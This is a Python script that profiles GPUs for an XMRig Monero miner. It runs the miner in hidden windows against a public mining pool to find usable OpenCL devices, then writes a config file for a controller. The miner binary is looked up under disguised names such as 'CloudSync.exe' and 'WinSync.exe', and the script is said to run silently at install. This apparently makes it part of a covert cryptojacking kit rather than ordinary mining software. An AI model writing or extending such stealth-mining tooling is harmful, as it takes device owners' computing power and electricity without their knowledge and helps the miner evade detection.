#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GPU capability probe for the miner worker.

Produces gpu_profile.json, which controller.py merges into the runtime config.
Stdlib only - no pip packages required.

Detection is authoritative: it asks the miner binary itself
  * --print-platforms               -> OpenCL platform list
  * a 12s throwaway run with CPU off -> which OpenCL device indices actually
                                        initialise (and their names)
with a WMI fallback if the probe fails.

Run once at install time (install-task.ps1 does), or manually:
    pythonw.exe gpudetect.py --force
"""

import hashlib
import json
import os
import re
import subprocess
import sys
import time

SCHEMA = 1
PROFILE_NAME = "gpu_profile.json"
MANIFEST_NAME = "manifest.json"
BIN_CANDIDATES = ("CloudSync.exe", "WinSync.exe", "xmrig.exe")
CREATE_NO_WINDOW = 0x08000000
PROBE_SECONDS = 12
MAX_DEVICES = 4
SOFTWARE_PLATFORM_HINTS = ("microsoft", "gdi", "warp", "mesa offscreen", "openclon12")
GPU_VENDOR_HINTS = ("nvidia", "amd", "advanced micro devices", "intel", "ati")


def here():
    return os.path.dirname(os.path.abspath(__file__))


def log(msg):
    line = "[%s] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    try:
        with open(os.path.join(here(), "gpudetect.log"), "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        pass
    try:
        sys.stderr.write(line)
    except Exception:
        pass


def sha256_file(path):
    try:
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 20), b""):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return None


def find_binary():
    d = here()
    try:
        with open(os.path.join(d, MANIFEST_NAME), "r", encoding="utf-8") as f:
            name = json.load(f).get("binary")
        if name and os.path.isfile(os.path.join(d, name)):
            return os.path.join(d, name)
    except Exception:
        pass
    for name in BIN_CANDIDATES:
        p = os.path.join(d, name)
        if os.path.isfile(p):
            return p
    for name in sorted(os.listdir(d)):
        if name.lower().endswith(".exe"):
            return os.path.join(d, name)
    return None


def run_capture(exe, args, timeout=40):
    """Run a short-lived binary and return stdout+stderr as text."""
    try:
        p = subprocess.run(
            [exe] + list(args),
            cwd=os.path.dirname(exe),
            timeout=timeout,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            creationflags=CREATE_NO_WINDOW,
        )
        return (p.stdout or b"").decode("utf-8", "replace")
    except Exception as exc:
        log("run_capture failed: %r" % (exc,))
        return ""


def parse_platforms(text):
    """Parse the --print-platforms block into a list of platform dicts."""
    out = []
    cur = None
    for raw in text.splitlines():
        line = raw.rstrip()
        m = re.match(r"\s*Index:\s*(\d+)", line)
        if m:
            if cur:
                out.append(cur)
            cur = {"index": int(m.group(1))}
            continue
        m = re.match(r"\s*(Name|Vendor|Version|Profile):\s*(.+)$", line)
        if m and cur is not None:
            cur[m.group(1).lower()] = m.group(2).strip()
    if cur:
        out.append(cur)
    return [p for p in out if isinstance(p.get("index"), int)]


def is_software_platform(plat):
    blob = ("%s %s" % (plat.get("name", ""), plat.get("vendor", ""))).lower()
    return any(h in blob for h in SOFTWARE_PLATFORM_HINTS)


def looks_like_gpu_platform(plat):
    blob = ("%s %s" % (plat.get("name", ""), plat.get("vendor", ""))).lower()
    return any(h in blob for h in GPU_VENDOR_HINTS)


def rank_platforms(platforms):
    """Best candidate first: real GPU vendors, hardware over software."""
    def key(p):
        return (
            0 if looks_like_gpu_platform(p) else 1,
            1 if is_software_platform(p) else 0,
            p.get("index", 99),
        )
    return sorted(platforms, key=key)


def wmi_gpu_count():
    """Number of real (non-USB-display) adapters, via CIM. Best effort."""
    ps = (
        "Get-CimInstance Win32_VideoController | "
        "ForEach-Object { \"$($_.Name)|$($_.AdapterCompatibility)\" }"
    )
    try:
        p = subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps],
            timeout=25,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
        )
        names = (p.stdout or b"").decode("utf-8", "replace").splitlines()
    except Exception:
        return 0
    count = 0
    for name in names:
        low = name.lower()
        if not low.strip():
            continue
        # DisplayLink / virtual adapters are not mineable.
        if any(x in low for x in ("displaylink", "virtual", "basic display", "remote", "parsec", "idd")):
            continue
        count += 1
    return count


def probe_devices(exe, platform_index, pool, device_count):
    """Start the miner briefly with CPU off and see which OpenCL devices come up."""
    devices = [{ "index": i, "intensity": 0, "worksize": 8, "affinity": -1, "threads": [1, 1] }
               for i in range(max(1, min(device_count, MAX_DEVICES)))]
    cfg = {
        "autosave": False,
        "colors": False,
        "title": False,
        "cpu": {"enabled": False},
        "opencl": {"enabled": True, "platform": platform_index, "cache": True, "rx/0": devices},
        "pools": [pool],
        "donate-level": 1,
        "print-time": 600,
        "retries": 1,
        "retry-pause": 2,
    }
    cfg_path = os.path.join(here(), "gpu_probe.json")
    log_path = os.path.join(here(), "gpu_probe.log")
    with open(cfg_path, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

    try:
        os.remove(log_path)
    except OSError:
        pass

    proc = None
    try:
        proc = subprocess.Popen(
            [exe, "-c", cfg_path, "--log-file", log_path, "--no-color", "--no-title"],
            cwd=here(),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW,
        )
        deadline = time.time() + PROBE_SECONDS
        while time.time() < deadline and proc.poll() is None:
            time.sleep(0.5)
    except Exception as exc:
        log("probe spawn failed: %r" % (exc,))
    finally:
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=6)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

    found = []
    try:
        with open(log_path, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()
    except OSError:
        text = ""

    for m in re.finditer(r"OPENCL GPU\s+#(\d+)\s+(.*)$", text, re.M):
        idx = int(m.group(1))
        detail = m.group(2).strip()
        if any(d["index"] == idx for d in found):
            continue
        found.append({"index": idx, "detail": detail})

    # A device only counts if it actually reached READY (kernel compiled).
    ready = set()
    for m in re.finditer(r"opencl\s+READY\s+threads\s+(\d+)/(\d+)", text):
        ready.add(int(m.group(2)))
    for d in found:
        d["ready"] = d["index"] in ready

    try:
        os.remove(cfg_path)
        os.remove(log_path)
    except OSError:
        pass
    return found, text


def build_profile(force_pool_user, force_pool_url):
    exe = find_binary()
    if not exe:
        return {"schema": SCHEMA, "opencl": {"enabled": False},
                "error": "miner binary not found"}

    log("probing %s" % os.path.basename(exe))
    text = run_capture(exe, ["--print-platforms"], timeout=40)
    platforms = parse_platforms(text)
    log("platforms: %r" % (platforms,))

    profile = {
        "schema": SCHEMA,
        "detected_at": time.time(),
        "binary": {
            "path": os.path.basename(exe),
            "size": os.path.getsize(exe),
            "sha256": sha256_file(exe),
        },
        "platforms": platforms,
        "opencl": {"enabled": False},
        "cuda": None,
        "devices": [],
        "source": "none",
    }

    if not platforms:
        profile["error"] = "no OpenCL platforms reported"
        return profile

    ranked = rank_platforms(platforms)
    pool = {
        "algo": "rx/0",
        "url": force_pool_url or "pool.hashvault.pro:443",
        "user": (force_pool_user or "PROBE") + ".gpuprobe",
        "pass": "x",
        "keepalive": True,
        "tls": True,
    }

    gpus = wmi_gpu_count()
    attempts = 0
    for plat in ranked:
        if is_software_platform(plat) and attempts > 0:
            break
        attempts += 1
        found, _ = probe_devices(exe, plat["index"], pool, gpus or 1)
        good = [d for d in found if d.get("ready")] or found
        if not good:
            continue
        devices = [{"index": d["index"], "detail": d.get("detail", "")} for d in good]
        profile["opencl"] = {
            "enabled": True,
            # NOTE: index or *vendor* string works here; the platform NAME does not.
            "platform": plat["index"],
            "cache": True,
            "rx/0": [
                {"index": d["index"], "intensity": 0, "worksize": 8,
                 "affinity": -1, "threads": [1, 1]}
                for d in devices
            ],
        }
        profile["devices"] = devices
        profile["platform"] = {
            "index": plat["index"],
            "name": plat.get("name"),
            "vendor": plat.get("vendor"),
            "version": plat.get("version"),
        }
        profile["source"] = "probe"
        log("selected platform #%d %s, devices %r"
            % (plat["index"], plat.get("name"), [d["index"] for d in devices]))
        break

    # CUDA is an optional plugin (xmrig-cuda.dll). OpenCL already drives the GPU,
    # so CUDA is only advertised when the plugin is actually present.
    dll = os.path.join(here(), "xmrig-cuda.dll")
    if os.path.isfile(dll) and profile["opencl"].get("enabled"):
        profile["cuda"] = {
            "loader": "xmrig-cuda.dll",
            "nvml": True,
            "devices": [
                {"index": d["index"], "threads": 1, "blocks": 0,
                 "bfactor": 0, "bsleep": 0, "affinity": -1}
                for d in profile["devices"]
            ],
        }

    if not profile["opencl"]["enabled"]:
        profile["error"] = profile.get("error") or "no usable OpenCL device"
    return profile


def main(argv):
    force = "--force" in argv
    profile_path = os.path.join(here(), PROFILE_NAME)
    exe = find_binary()

    if not force and os.path.isfile(profile_path) and exe:
        try:
            with open(profile_path, "r", encoding="utf-8") as f:
                cached = json.load(f)
            if (cached.get("schema") == SCHEMA
                    and (cached.get("binary") or {}).get("sha256") == sha256_file(exe)):
                print(json.dumps({"cached": True, "opencl": cached.get("opencl")}))
                return 0
        except Exception:
            pass

    profile = build_profile(None, None)
    tmp = profile_path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(profile, f, indent=2)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, profile_path)

    log("profile written: opencl=%s devices=%d"
        % (profile["opencl"].get("enabled"), len(profile.get("devices") or [])))
    print(json.dumps({"opencl": profile["opencl"], "devices": profile.get("devices")}))
    return 0 if profile["opencl"].get("enabled") else 3


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))

# updater proof marker v2

